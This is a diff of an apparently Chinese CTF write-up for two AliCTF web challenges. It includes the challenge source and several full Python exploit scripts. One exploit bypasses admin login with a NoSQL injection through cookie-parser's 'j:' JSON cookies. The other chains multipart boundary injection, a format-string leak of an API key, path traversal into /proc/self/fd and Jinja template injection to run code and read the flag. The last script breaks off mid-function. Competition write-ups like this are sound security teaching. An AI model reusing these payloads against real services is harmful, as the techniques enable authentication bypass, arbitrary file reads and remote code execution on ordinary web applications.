@@ -620,293 +620,6 @@ GGWP
 4. [JNDIMap](https://github.com/X1r0z/JNDIMap)
 5. [NIKO15次梦碎Major](https://www.bilibili.com/video/BV1AZmEBVEsU/?share_source=copy_web&vd_source=8c76f8e232993e8e3083ed467fe773f7)、[😭一生只哭18次😭](https://www.bilibili.com/video/BV1GEm9BoEnq/?spm_id_from=333.337.search-card.all.click&vd_source=6870219ddced853e80ae239d5319e97c)、[【活着】“所以生命啊，它苦涩如歌”](https://www.bilibili.com/video/BV15Y4y117sn/?share_source=copy_web&vd_source=8c76f8e232993e8e3083ed467fe773f7)
 
-## easy_login
-
-通过审计 src/server.ts，可以发现
-
-  admin 用户会随机生成一个长字符串密码
-
-![img](/img/2026-alictf/15.png)
-
-  Flag 在 /admin 接口中返回，该接口要求当前登录用户必须是 admin
-
-![img](/img/2026-alictf/16.png)
-
- 使用 cookie-parser 解析 Cookie，并将解析出的 sid 直接给数据库查询
-
-![img](/img/2026-alictf/17.png)
-
-  在 sessionMiddleware 中以下代码存在nosql注入
-
-![img](/img/2026-alictf/18.png)
-
- 当 Cookie 以 j: 开头时，cookie-parser 会尝试将其解析为 JSON 对象。如果我们将 sid 设置为 {"$ne": "random_value"}，查询语句将变为 db.sessions.findOne({ sid: { "$ne": "random_value" } })
-
-所以我们可以通过 /visit 接口，利用应用内部的 Bot 自动进行管理员登录。这将导致数据库中产生一个admin 用户的 Session，再使用 NoSQL 注入绕过 sid 的精确匹配。设置Cookie 为sid=j:{"$ne": "anything"} 访问 /admin，就可以绕过鉴权
-
-exp
-
-```Python
-import requests
-
-target = "http://223.6.249.127:12106"
-
-# 第一步：唤醒 Bot 登录，产生 Admin Session
-print("[*] Waking up the bot...")
-requests.post(f"{target}/visit", json={"url": "http://example.com"})
-
-# 第二步：使用 NoSQL 注入 Cookie 劫持 Admin 权限
-print("[*] Exploiting NoSQL Injection...")
-cookies = {
-    # 'j:' 前缀触发 cookie-parser 的 JSON 解析逻辑
-    "sid": 'j:{"$ne": "null"}'
-}
-
-res = requests.get(f"{target}/admin", cookies=cookies)
-print("[+] Server Response:")
-print(res.text)
-```
-
-flag
-
-```
-alictf{0c6b7a19-8a74-4129-8dc8-913e98cad823}
-```
-
-## Cutter
-
-审计代码可以发现admin路由下存在可以利用的一些点
-
-![img](/img/2026-alictf/19.png)
-
- path.join`拼接`tmpl`参数时没有过滤`..`，导致路径穿越和任意文件读取
-
-读取的文件内容直接通过 `render_template_string` 渲染。如果我们能控制被读取的文件内容，就能实现 SSTI
-
-但是这里存在一个问题就是需要API_KEY才能实现
-
-还有action路由下存在格式化字符串漏洞可以利用
-
-![img](/img/2026-alictf/20.png)
-
-在 `debug` 模式下，允许通过 `content.format(app)` 泄露对象属性。这可以用来泄露全局变量中的 `API_KEY`
-
-heartbeat路由
-
-![img](/img/2026-alictf/21.png)
-
-可以发现我们可以通过请求参数控制任意的 `headers，`可以注入 `Content-Type` 来改变 `httpx` 发往由 `/action` 接收的数据包的结构
-
-`/heartbeat` 硬编码了 `action` 类型为 `echo`，无法直接触发 `/action` 的 `debug` 模式。但通过注入 `Content-Type` 头部，我们可以劫持数据包，设置 `client=Content-Type`和`token=multipart/form-data; boundary=HACKER`，在 `text` 字段中构造包含 `{"type": "debug"}` 的 `action` 部分
-
-这样当 `/action` 收到请求时，它会优先使用我们注入的 `HACKER` 作为 Boundary。后端会读取我们在 `text` 中构造的第二个 `action` 字段，从而覆盖掉原始的 `echo` 
-
-泄漏 Payload:`{0.view_functions[index].globals[API_KEY]}`
-
-可以得到`API_KEY = 911ec63d10f2bd607080ca3ff396a647699de5159e13f99c615e03fd9aa2a806`
-
-拿到了 `API_KEY` 后，我们可以访问 `/admin`。虽然可以 LFI 读文件，但是我们不知道flag的具体文件名。
-
-![img](/img/2026-alictf/22.png)
-
-在 Linux 中，`/proc/self/fd/` 包含了进程当前打开的所有文件描述符。FD 3通常是服务器监听的 Socket。FD 4-10: 通常是当前正在处理请求的输入流（`wsgi.input`）或者因请求体过大而产生的临时缓存文件。
-
-所以如果我们包含正在读取我们请求体的那个 FD，`/admin` 就会读取我们发送的内容。
-
-让ai写了个FD条件竞争的脚本
-
-```Python
-import requests
-import threading
-import time
-import socket
-
-TARGET_IP = "223.6.249.127"
-TARGET_PORT = "34696"
-BASE_URL = f"http://{TARGET_IP}:{TARGET_PORT}"
-API_KEY = "911ec63d10f2bd607080ca3ff396a647699de5159e13f99c615e03fd9aa2a806"
-
-def trigger_upload():
-    print("[*] Starting large upload to /heartbeat...")
-    # Payload: list root directory
-    ssti = "{{ config.class.init.globals['os'].listdir('/') }}"
-    padding = "A" * (600000) # 600KB padding to ensure it goes to disk
-    payload = ssti + padding
-
-    try:
-        # We use a long timeout to keep the connection open as long as possible
-        r = requests.post(f"{BASE_URL}/heartbeat", data={"text": payload}, timeout=30)
-        print(f"[] Upload finished with status {r.status_code}")
-    except Exception as e:
-        print(f"[] Upload error (expected if we block): {e}")
-
-def brute_fd_ssti():
-    time.sleep(2) # Wait for upload to start and potentially hit /action
-    print("[*] Starting FD brute force on /admin...")
-    headers = {"Authorization": API_KEY}
-
-    for fd in range(4, 25):
-        try:
-            # We hit /admin which will read the FD
-            # If the FD is the temp file, it will render our SSTI
-            params = {"tmpl": f"../../../../proc/self/fd/{fd}"}
-            r = requests.get(f"{BASE_URL}/admin", headers=headers, params=params, timeout=2)
-            if r.status_code == 200 and "['" in r.text and "flag" in r.text:
-                print(f"\n[!!!] SUCCESS! Found listing on FD {fd}:")
-                print(r.text)
-                return True
-            elif r.status_code == 200:
-                print(f"FD {fd} returned 200 but no flag listing. Snippet: {r.text[:50]}")
-        except:
-            pass
-    return False
-
-Run upload in background
-t = threading.Thread(target=trigger_upload)
-t.start()
-
-Brute force FDs
-brute_fd_ssti()
-```
-
-1. 由一个线程向 `/heartbeat` 发送超大请求（几百 KB 的填充数据），目的是让 Werkzeug 将请求体写入磁盘上的临时文件。
-2. 主线程同时在 `/admin` 上循环尝试读取各显 FD（如 `/proc/self/fd/6`）。
-
-运行脚本的目标不是直接读 Flag 文件，而是希望 FD 里面是我们发送的 SSTI Payload `{{ config...os.listdir('/') }}`，从而让我们执行命令去寻找 Flag。
-
-结果在进行到Step 1147的时候收到了如下响应： `FD 6 returned 200 but no flag listing. Snippet: alictf{301e7a69...}`
-
-ai分析原因：
-
-1. 残存数据 (Residual Buffers): 服务器是多线程的。在之前的格式化字符串攻击中，我们可能已经通过 format(app) 引起了某些包含了 flag 或者系统环境信息的变量被输出到了某个内部缓冲区。
-2. 异步连接泄露: 当我们通过 /admin 包含正在处理的 Socket FD 时，我们读取的是该 FD 对应的 内核级缓冲区 (Kernel Buffer)。如果这个时候服务器刚刚处理完一个含有泄露信息的请求，或者正在处理带有敏感数据的其他内部请求，通过 LFI 读取 FD 会直接捕获到这些“尚未清除”的原始数据。
-3. 内存映射: 在某些 Python 版本中，render_template_string 的处理逻辑结合 Werkzeug 对 wsgi.input 的处理，在极端高并发的情况下，FD 可能会指向一个被重置前留有前一个请求内容的内存页。
-
-简单来说：我们像是在服务器的数据交换管道里插了一根吸管（通过读取 FD），本来想吸出自己的 Payload，结果顺带吸出了前序攻击或系统处理中残存在管道里的 Flag。
-
-exp
-
-```Python
-import requests
-import threading
-import time
-import re
-
-# --- Configuration ---
-TARGET_URL = "http://223.6.249.127:34696"
-
-def leak_api_key():
-    print("[*] Stage 1: Leaking API_KEY via Format String & Boundary Injection...")
-    
-    # Payload to leak the API_KEY variable from app's global scope
-    # index is the view function name, which is 'action' or 'heartbeat' in this context
-    payload_str = "{0.view_functions[index].__globals__[API_KEY]}"
-    
-    MY_BOUNDARY = "AaB03x"
-    # We inject a fake multipart body inside the 'text' field to override the 'action' part
-    inner_payload = (
-        f"{payload_str}\r\n"
-        f"--{MY_BOUNDARY}\r\n"
-        'Content-Disposition: form-data; name="action"; filename="action.json"\r\n\r\n'
-        '{"type": "debug"}\r\n'
-        f"--{MY_BOUNDARY}--\r\n"
-    )
-    
-    data = {
-        "client": "content-type", # Header Injection: Control Content-Type
-        "token": f"multipart/form-data; boundary={MY_BOUNDARY}", # Set our custom boundary
-        "text": inner_payload
-    }
-    
-    try:
-        r = requests.post(f"{TARGET_URL}/heartbeat", data=data)
-        if r.status_code == 200:
-            # The API_KEY is a 64-char hex string (os.urandom(32).hex())
-            match = re.search(r"([a-f0-9]{64})", r.text)
-            if match:
-                api_key = match.group(1)
-                print(f"[+] Found API_KEY: {api_key}")
-                return api_key
-    except Exception as e:
-        print(f"[-] Error leaking API_KEY: {e}")
-    return None
-
-def find_flag_filename(api_key):
-    print("[*] Stage 2: Finding Flag filename via LFI -> SSTI Race Condition...")
-    
-    ssti_payload = "{{ config.__class__.__init__.__globals__['os'].listdir('/') }}"
-    stop_event = threading.Event()
-
-    def spammer():
-        while not stop_event.is_set():
-            try:
-                # Keep sending the SSTI payload to fill socket buffers
-                requests.get(f"{TARGET_URL}/heartbeat", params={"text": ssti_payload}, timeout=1)
-            except: pass
-
-    # Start background spammers
-    threads = []
-    for _ in range(8):
-        t = threading.Thread(target=spammer)
-        t.daemon = True
-        t.start()
-        threads.append(t)
-
-    headers = {"Authorization": api_key}
-    flag_file = None
-
-    print("[*] Hunting for payload in /proc/self/fd/...")
-    start_time = time.time()
-    while time.time() - start_time < 60: # 1 minute timeout
-        for fd in range(4, 15):
-            try:
-                # LFI into the procfs FD to read our own incoming request and render it as a template
-                r = requests.get(f"{TARGET_URL}/admin", headers=headers, params={"tmpl": f"../../../../proc/self/fd/{fd}"}, timeout=1)
-                if r.status_code == 200 and "['app.py'" in r.text:
-                    # Look for the random flag filename
-                    match = re.search(r"flag-[a-f0-9]{32}\.txt", r.text)
-                    if match:
-                        flag_file = match.group(0)
-                        print(f"[+] Found flag file: {flag_file}")
-                        stop_event.set()
-                        return flag_file
-            except: pass
-        time.sleep(0.1)
-    
-    stop_event.set()
-    return None
-
-def read_flag(api_key, filename):
-    print(f"[*] Stage 3: Reading {filename}...")
-    headers = {"Authorization": api_key}
-    try:
-        # Simple LFI to read the flag
-        r = requests.get(f"{TARGET_URL}/admin", headers=headers, params={"tmpl": f"../../../../{filename}"})
-        if r.status_code == 200:
-            print(f"\n[!!!] FLAG: {r.text.strip()}")
-            return True
-    except Exception as e:
-        print(f"[-] Error: {e}")
-    return False
-
-if __name__ == "__main__":
-    key = leak_api_key()
-    if key:
-        flag_file = find_flag_filename(key)
-        if flag_file:
-            read_flag(key, flag_file)
-        else:
-            print("[-] Failed to find flag filename. The race might be tough.")
-    else:
-        print("[-] Failed to leak API_KEY.")
-```
-
-flag
-
-```
-alictf{301e7a69-1262-4955-abe7-c8a120bd2093}
-```
-
 ## Backup Exec
 
 Re + Web
@@ -1127,6 +840,798 @@ def main():
 
 if __name__ == "__main__":
     main()
+```
+
+## Easy Login
+
+```javascript
+const $ = (id) => document.getElementById(id);
+
+const terminalBody = $('terminalBody');
+const currentUser = $('currentUser');
+
+function appendLine(className, text) {
+  const line = document.createElement('div');
+  line.className = `line ${className}`;
+  line.textContent = text;
+  terminalBody.appendChild(line);
+  terminalBody.scrollTop = terminalBody.scrollHeight;
+}
+
+function logRequest(method, path, body) {
+  const payload = body ? ` ${JSON.stringify(body)}` : '';
+  appendLine('request-line', `$ fetch ${method.toUpperCase()} ${path}${payload}`);
+}
+
+function logResponse(status, json) {
+  appendLine('meta-line', `< status ${status} >`);
+  appendLine('response-line', JSON.stringify(json));
+}
+
+function logError(err) {
+  appendLine('error-line', `! error: ${err}`);
+}
+
+function updateUserLabel(username) {
+  if (!username) {
+    currentUser.textContent = 'guest';
+    currentUser.classList.add('pill-muted');
+    return;
+  }
+  currentUser.textContent = username;
+  currentUser.classList.remove('pill-muted');
+}
+
+async function callApi(method, path, body) {
+  try {
+    logRequest(method, path, body);
+
+    const res = await fetch(path, {
+      method,
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: body ? JSON.stringify(body) : undefined,
+      credentials: 'same-origin'
+    });
+
+    const text = await res.text();
+    let json;
+    try {
+      json = JSON.parse(text);
+    } catch {
+      json = { raw: text };
+    }
+
+    logResponse(res.status, json);
+    return { res, json };
+  } catch (err) {
+    logError(err);
+    throw err;
+  }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+  $('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const username = $('username').value.trim();
+    const password = $('password').value;
+
+    if (!username || !password) {
+      logError('username and password required');
+      return;
+    }
+
+    try {
+      const { res, json } = await callApi('post', '/login', { username, password });
+      if (res.ok) {
+        updateUserLabel(json.username || username);
+      }
+    } catch (err) {
+      console.error(err);
+    }
+  });
+
+  $('btnLogout').addEventListener('click', async () => {
+    try {
+      await callApi('post', '/logout');
+      updateUserLabel(null);
+    } catch (err) {
+      console.error(err);
+    }
+  });
+
+  $('btnMe').addEventListener('click', async () => {
+    try {
+      const { json } = await callApi('get', '/me');
+      if (json && json.loggedIn && json.username) {
+        updateUserLabel(json.username);
+      } else {
+        updateUserLabel(null);
+      }
+    } catch (err) {
+      console.error(err);
+    }
+  });
+
+  $('btnAdmin').addEventListener('click', async () => {
+    try {
+      await callApi('get', '/admin');
+    } catch (err) {
+      console.error(err);
+    }
+  });
+
+  $('btnVisit').addEventListener('click', async () => {
+    const urlInput = $('visitUrl');
+    const url = urlInput.value.trim();
+
+    if (!url) {
+      logError('url is required for /visit');
+      return;
+    }
+
+    try {
+      await callApi('post', '/visit', { url });
+    } catch (err) {
+      console.error(err);
+    }
+  });
+});
+```
+
+没什么问题
+
+```typescript
+import dotenv from 'dotenv';
+import express, { Request, Response, NextFunction } from 'express';
+import cookieParser from 'cookie-parser';
+import { MongoClient, Db, Collection } from 'mongodb';
+import crypto from 'crypto';
+import path from 'path';
+import puppeteer from 'puppeteer';
+
+dotenv.config();
+
+const app = express();
+const PORT = Number(process.env.PORT) || 3000;
+
+const mongoUri = process.env.MONGO_URI || process.env.MONGO_URL || 'mongodb://127.0.0.1:27017/easy_login';
+const dbName = process.env.MONGO_DB_NAME || 'easy_login';
+const FLAG = process.env.FLAG || 'flag{dummy_flag_for_testing}';
+const APP_INTERNAL_URL = process.env.APP_INTERNAL_URL || `http://127.0.0.1:${PORT}`;
+const ADMIN_PASSWORD = crypto.randomBytes(16).toString('hex');
+
+interface UserDoc {
+  username: string;
+  password: string;
+}
+
+interface SessionDoc {
+  sid: string;
+  username: string;
+  createdAt: Date;
+}
+
+interface AuthedRequest extends Request {
+  user?: { username: string } | null;
+  collections?: {
+    users: Collection<UserDoc> | null;
+    sessions: Collection<SessionDoc> | null;
+  };
+}
+
+let db: Db | null = null;
+let usersCollection: Collection<UserDoc> | null = null;
+let sessionsCollection: Collection<SessionDoc> | null = null;
+
+const publicDir = path.join(__dirname, '../public');
+
+async function runXssVisit(targetUrl: string): Promise<void> {
+  if (typeof targetUrl !== 'string' || !/^https?:\/\//i.test(targetUrl)) {
+    throw new Error('invalid target url');
+  }
+
+  const browser = await puppeteer.launch({
+    headless: true,
+    args: ['--no-sandbox', '--disable-setuid-sandbox']
+  });
+
+  try {
+    const page = await browser.newPage();
+
+    await page.goto(APP_INTERNAL_URL + '/', {
+      waitUntil: 'networkidle2',
+      timeout: 15000
+    });
+
+    await page.type('#username', 'admin', { delay: 30 });
+    await page.type('#password', ADMIN_PASSWORD, { delay: 30 });
+
+    await Promise.all([
+      page.click('#loginForm button[type="submit"]'),
+      page.waitForResponse(
+        (res) => res.url().endsWith('/login') && res.request().method() === 'POST',
+        { timeout: 10000 }
+      ).catch(() => undefined)
+    ]);
+
+    await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 15000 });
+
+    await new Promise((resolve) => setTimeout(resolve, 5000));
+  } finally {
+    await browser.close();
+  }
+}
+
+async function createSessionForUser(user: UserDoc): Promise<string> {
+  if (!sessionsCollection) {
+    throw new Error('sessions collection not initialized');
+  }
+
+  const sid = crypto.randomBytes(16).toString('hex');
+
+  await sessionsCollection.insertOne({
+    sid,
+    username: user.username,
+    createdAt: new Date()
+  });
+
+  return sid;
+}
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: false }));
+app.use(cookieParser());
+app.use(express.static(publicDir));
+
+async function initMongo(): Promise<void> {
+  const client = new MongoClient(mongoUri);
+  await client.connect();
+  db = client.db(dbName);
+  usersCollection = db.collection<UserDoc>('users');
+  sessionsCollection = db.collection<SessionDoc>('sessions');
+
+  let adminUser = await usersCollection.findOne({ username: 'admin' });
+  if (!adminUser) {
+    await usersCollection.insertOne({
+      username: 'admin',
+      password: ADMIN_PASSWORD
+    });
+  } else {
+    await usersCollection.updateOne(
+      { username: 'admin' },
+      { $set: { password: ADMIN_PASSWORD } }
+    );
+  }
+
+  adminUser = await usersCollection.findOne({ username: 'admin' });
+  console.log(`[init] Admin password set to: ${ADMIN_PASSWORD}`);
+}
+
+async function sessionMiddleware(req: AuthedRequest, res: Response, next: NextFunction): Promise<void> {
+  const sid = req.cookies?.sid as string | undefined;
+  if (!sid || !sessionsCollection || !usersCollection) {
+    req.user = null;
+    return next();
+  }
+
+  try {
+    const session = await sessionsCollection.findOne({ sid });
+    if (!session) {
+      req.user = null;
+      return next();
+    }
+
+    const user = await usersCollection.findOne({ username: session.username });
+    if (!user) {
+      req.user = null;
+      return next();
+    }
+
+    req.user = { username: user.username };
+    return next();
+  } catch (err) {
+    console.error('Error in session middleware:', err);
+    req.user = null;
+    return next();
+  }
+}
+
+app.use((req: AuthedRequest, _res: Response, next: NextFunction) => {
+  req.collections = {
+    users: usersCollection,
+    sessions: sessionsCollection
+  };
+  next();
+});
+
+app.use(sessionMiddleware as any);
+
+app.get('/', (_req: AuthedRequest, res: Response) => {
+  res.sendFile(path.join(publicDir, 'index.html'));
+});
+
+app.post('/login', async (req: AuthedRequest, res: Response) => {
+  const { username, password } = req.body as { username?: unknown; password?: unknown };
+  
+  if (typeof username !== 'string' || typeof password !== 'string') {
+    return res.status(400).json({ error: 'username and password must be strings' });
+  }
+
+  if (!username || !password) {
+    return res.status(400).json({ error: 'username and password required' });
+  }
+
+  if (!usersCollection) {
+    return res.status(500).json({ error: 'Database not initialized yet' });
+  }
+  
+  try {
+    let user = await usersCollection.findOne({ username });
+
+    if (!user) {
+      if (username === 'admin') {
+        return res.status(403).json({ error: 'admin user not available' });
+      }
+      await usersCollection.insertOne({ username, password });
+      user = await usersCollection.findOne({ username });
+    }
+
+    if (!user || user.password !== password) {
+      return res.status(401).json({ error: 'invalid credentials' });
+    }
+
+    const sid = await createSessionForUser(user);
+
+    res.cookie('sid', sid, {
+      httpOnly: false,
+      sameSite: 'lax'
+    });
+
+    return res.json({
+      ok: true,
+      sid,
+      username: user.username
+    });
+  } catch (err) {
+    console.error('Error in /login:', err);
+    return res.status(500).json({ error: 'internal error' });
+  }
+});
+
+app.post('/logout', async (req: AuthedRequest, res: Response) => {
+  res.clearCookie('sid');
+  res.json({ ok: true });
+});
+
+app.get('/me', (req: AuthedRequest, res: Response) => {
+  if (!req.user) {
+    return res.json({ loggedIn: false });
+  }
+  res.json({
+    loggedIn: true,
+    username: req.user.username
+  });
+});
+
+app.get('/admin', (req: AuthedRequest, res: Response) => {
+  if (!req.user || req.user.username !== 'admin') {
+    return res.status(403).json({ error: 'admin only' });
+  }
+
+  res.json({ flag: FLAG });
+});
+app.post('/visit', async (req: Request, res: Response) => {
+  const { url } = req.body as { url?: unknown };
+
+  if (typeof url !== 'string') {
+    return res.status(400).json({ error: 'url must be a string' });
+  }
+
+  try {
+    await runXssVisit(url);
+    return res.json({ ok: true });
+  } catch (err: any) {
+    console.error('XSS bot error:', err);
+    return res.status(500).json({ error: 'bot failed', detail: String(err) });
+  }
+});
+
+initMongo()
+  .then(() => {
+    app.listen(PORT, () => {
+      console.log(`Server listening on port ${PORT}`);
+    });
+  })
+  .catch((err: unknown) => {
+    console.error('Failed to initialize MongoDB:', err);
+    process.exit(1);
+  });
+```
+
+`cookie-parser`有个特性，如果传入的 Cookie 值以`j:`开头，它会自动将后面的内容作为 JSON 进行解析，并将其转换为 JavaScript 对象返回，`let adminUser = await usersCollection.findOne({ username: 'admin' });`一眼丁真 nosql 注入，下一步就是找传参的位置
+
+```typescript
+async function sessionMiddleware(req: AuthedRequest, res: Response, next: NextFunction): Promise<void> {
+  // 这里的 as string 只是 TypeScript 的编译期类型断言，运行时无效
+  const sid = req.cookies?.sid as string | undefined; 
+  // ...
+  const session = await sessionsCollection.findOne({ sid });
+  // ...
+}
+```
+
+如果在请求中发送`Cookie: sid=j:{"$ne": null}`，在运行时`req.cookies.sid`将不再是一个字符串，而是一个真实的 JavaScript 对象`{"$ne": null}`
+
+exp 如下
+
+```python
+import requests
+
+TARGET_URL = "http://223.6.249.127:10977"
+
+def get_flag():
+    try:
+        requests.post(
+            f"{TARGET_URL}/visit",
+            json={"url": f"{TARGET_URL}/"},
+            timeout=20
+        )
+    except requests.exceptions.RequestException:
+        pass
+
+    try:
+        res = requests.get(
+            f"{TARGET_URL}/admin",
+            cookies={"sid": 'j:{"$ne": "1"}'},
+            timeout=10
+        )
+        print(res.text)
+    except requests.exceptions.RequestException as e:
+        print(e)
+
+if __name__ == "__main__":
+    get_flag()
+```
+
+## cutter
+
+```python
+from flask import Flask, request, render_template, render_template_string
+from io import BytesIO
+import os
+import json
+import httpx
+
+app = Flask(__name__)
+
+API_KEY = os.urandom(32).hex()
+HOST = '127.0.0.1:5000'
+
+@app.route('/admin', methods=['GET'])
+def admin():
+    token = request.headers.get("Authorization", "")
+    if token != API_KEY:
+        return 'unauth', 403
+
+    tmpl = request.values.get('tmpl', 'index.html')
+    tmpl_path = os.path.join('./templates', tmpl)
+
+    if not os.path.exists(tmpl_path):
+        return 'Not Found', 404
+
+    tmpl_content = open(tmpl_path, 'r').read()
+    return render_template_string(tmpl_content), 200
+
+@app.route('/action', methods=['POST'])
+def action():
+    ip = request.remote_addr
+    if ip != '127.0.0.1':
+        return 'only localhost', 403
+
+    token = request.headers.get("X-Token", "")
+    if token != API_KEY:
+        return 'unauth', 403
+    
+    file = request.files.get('content')
+    content = file.stream.read().decode()
+
+    action = request.files.get("action")
+    act = json.loads(action.stream.read().decode())
+
+    if act["type"] == "echo":
+        return content, 200
+    elif act["type"] == "debug":
+        return content.format(app), 200
+    else:
+        return 'unkown action', 400
+
+@app.route('/heartbeat', methods=['GET', 'POST'])
+def heartbeat():
+    text = request.values.get('text', "default")
+    client = request.values.get('client', "default")
+    token = request.values.get('token', "")
+
+    if len(text) > 300:
+        return "text too large", 400
+
+    action = json.dumps({"type" : "echo"})
+
+    form_data = {
+        'content': ('content', BytesIO(text.encode()), 'text/plain'),
+        'action' : ('action', BytesIO(action.encode()), 'text/json')
+    }
+
+    headers = {
+        "X-Token" : API_KEY,
+    }
+    headers[client] = token
+
+    response = httpx.post(f"http://{HOST}/action", headers=headers, files=form_data, timeout=10.0)
+    if response.status_code == 200:
+        return response.text, 200
+    else:
+        return f'action failed', 500
+
+@app.route('/', methods=['GET'])
+def index():
+    return render_template('index.html')
+
+if __name__ == '__main__':
+    app.run(debug=False, host='0.0.0.0', port=5000)
+```
+
+`/heartbeat`伪造 multipart → 打到本地`/action`的`debug`分支 → 泄露`API_KEY` → 带 key 打`/admin` → 路径穿越任意文件读，但是由于 flag 的位置不在`/flag`
+
+```shell
+#!/bin/bash
+
+if [ -n "$FLAG" ]; then
+    echo "$FLAG" > "/flag-$(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 32).txt"
+    unset FLAG
+else
+    echo "flag{testflag}" > "/flag-$(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 32).txt"
+fi
+
+useradd -M ctf
+
+su ctf -c 'cd /app && python app.py'
+```
+
+网上可以查到，在 Linux 中，`/proc/self/fd/` 包含了进程当前打开的所有文件描述符。FD 3通常是服务器监听的 Socket。FD 4-10: 通常是当前正在处理请求的输入流（`wsgi.input`）或者因请求体过大而产生的临时缓存文件，所以我们可以爆破 fd 去泄露 flag 内容
+
+但是又有一个问题，我们怎么才能产生大缓存呢？🥸
+
+而是 /heartbeat 解析外部大 multipart/form-data 时生成的临时上传文件 fd，exp 如下
+
+```python
+#!/usr/bin/env python3
+import argparse
+import re
+import socket
+import threading
+import time
+from typing import Optional, Tuple
+
+import requests
+
+
+API_KEY_RE = re.compile(r"([a-f0-9]{64})")
+FLAG_FILE_RE = re.compile(r"flag-[a-f0-9]{32}\.txt")
+FLAG_RE = re.compile(r"(alictf\{[^}]+\})")
+
+
+def leak_api_key(base_url: str) -> str:
+    payload = (
+        "{0.view_functions[admin].__globals__[API_KEY]}\r\n"
+        "--x\r\n"
+        'Content-Disposition: form-data; name="action"; filename="1"\r\n'
+        "\r\n"
+        '{"type":"debug"}'
+    )
+    response = requests.get(
+        f"{base_url}/heartbeat",
+        params={
+            "client": "Content-Type",
+            "token": "multipart/form-data; boundary=x",
+            "text": payload,
+        },
+        timeout=15,
+    )
+    response.raise_for_status()
+    match = API_KEY_RE.search(response.text)
+    if not match:
+        raise RuntimeError(f"failed to leak API key: {response.text[:200]!r}")
+    return match.group(1)
+
+
+def build_large_multipart(boundary: str, injected_template: str, pad_size: int) -> bytes:
+    parts = [
+        (
+            f"--{boundary}\r\n"
+            'Content-Disposition: form-data; name="text"\r\n'
+            "\r\n"
+            "x\r\n"
+        ).encode(),
+        (
+            f"--{boundary}\r\n"
+            'Content-Disposition: form-data; name="client"\r\n'
+            "\r\n"
+            "foo\r\n"
+        ).encode(),
+        (
+            f"--{boundary}\r\n"
+            'Content-Disposition: form-data; name="token"\r\n'
+            "\r\n"
+            "bar\r\n"
+        ).encode(),
+        (
+            f"--{boundary}\r\n"
+            'Content-Disposition: form-data; name="blob"; filename="blob.txt"\r\n'
+            "Content-Type: text/plain\r\n"
+            "\r\n"
+        ).encode(),
+    ]
+    end = f"\r\n--{boundary}--\r\n".encode()
+    return b"".join(parts) + injected_template.encode() + (b"A" * pad_size) + end
+
+
+def hold_large_upload(host: str, port: int, body: bytes, boundary: str, hold_after: int, hold_seconds: float) -> Tuple[threading.Thread, dict]:
+    state = {}
+
+    def worker() -> None:
+        try:
+            sock = socket.create_connection((host, port), timeout=10)
+            sock.settimeout(20)
+            request = (
+                f"POST /heartbeat HTTP/1.1\r\n"
+                f"Host: {host}:{port}\r\n"
+                f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
+                f"Content-Length: {len(body)}\r\n"
+                "Connection: close\r\n"
+                "\r\n"
+            ).encode()
+            sock.sendall(request)
+            sock.sendall(body[:hold_after])
+            state["first_chunk_sent"] = True
+            time.sleep(hold_seconds)
+            sock.sendall(body[hold_after:])
+
+            response = b""
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
+            state["response_head"] = response[:200]
+            sock.close()
+        except Exception as exc:
+            state["error"] = repr(exc)
+
+    thread = threading.Thread(target=worker, daemon=True)
+    thread.start()
+    return thread, state
+
+
+def find_flag_filename(base_url: str, api_key: str, fd_start: int, fd_end: int, scan_rounds: int) -> Tuple[str, int]:
+    headers = {"Authorization": api_key}
+    for _ in range(scan_rounds):
+        for fd in range(fd_start, fd_end + 1):
+            try:
+                response = requests.get(
+                    f"{base_url}/admin",
+                    headers=headers,
+                    params={"tmpl": f"../../../../proc/self/fd/{fd}"},
+                    timeout=1,
+                )
+            except requests.RequestException:
+                continue
+
+            if response.status_code != 200:
+                continue
+
+            match = FLAG_FILE_RE.search(response.text)
+            if match:
+                return match.group(0), fd
+        time.sleep(0.02)
+    raise RuntimeError("failed to find flag filename from proc fd scan")
+
+
+def read_flag(base_url: str, api_key: str, flag_file: str) -> str:
+    response = requests.get(
+        f"{base_url}/admin",
+        headers={"Authorization": api_key},
+        params={"tmpl": f"/{flag_file}"},
+        timeout=15,
+    )
+    response.raise_for_status()
+    match = FLAG_RE.search(response.text)
+    if not match:
+        raise RuntimeError(f"failed to extract flag: {response.text[:200]!r}")
+    return match.group(1)
+
+
+def parse_host_port(target: str) -> Tuple[str, int, str]:
+    target = target.strip()
+    if target.startswith("http://") or target.startswith("https://"):
+        base_url = target.rstrip("/")
+        host_port = re.sub(r"^https?://", "", base_url)
+    else:
+        host_port = target
+        base_url = f"http://{target}"
+
+    if ":" not in host_port:
+        raise ValueError("target must include host:port")
+
+    host, port_str = host_port.rsplit(":", 1)
+    return host, int(port_str), base_url
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="attachment_cutter exploit")
+    parser.add_argument(
+        "target",
+        nargs="?",
+        default="223.6.249.127:54789",
+        help="target in host:port or http://host:port format",
+    )
+    parser.add_argument("--pad-size", type=int, default=700000, help="bytes appended after SSTI payload")
+    parser.add_argument("--hold-after", type=int, default=600000, help="bytes to send before pausing")
+    parser.add_argument("--hold-seconds", type=float, default=10.0, help="pause duration while scanning fds")
+    parser.add_argument("--fd-start", type=int, default=4, help="start fd to scan")
+    parser.add_argument("--fd-end", type=int, default=20, help="end fd to scan")
+    parser.add_argument("--scan-rounds", type=int, default=400, help="how many scan loops to run")
+    args = parser.parse_args()
+
+    host, port, base_url = parse_host_port(args.target)
+
+    print(f"[*] Target: {base_url}")
+    api_key = leak_api_key(base_url)
+    print(f"[+] API key: {api_key}")
+
+    boundary = "----codexpoc7MA4YWxkTrZu0gW"
+    injected_template = "{{ cycler.__init__.__globals__.os.listdir('/') }}\n"
+    body = build_large_multipart(boundary, injected_template, args.pad_size)
+
+    upload_thread, upload_state = hold_large_upload(
+        host=host,
+        port=port,
+        body=body,
+        boundary=boundary,
+        hold_after=args.hold_after,
+        hold_seconds=args.hold_seconds,
+    )
+
+    wait_until = time.time() + 5
+    while not upload_state.get("first_chunk_sent"):
+        if time.time() > wait_until:
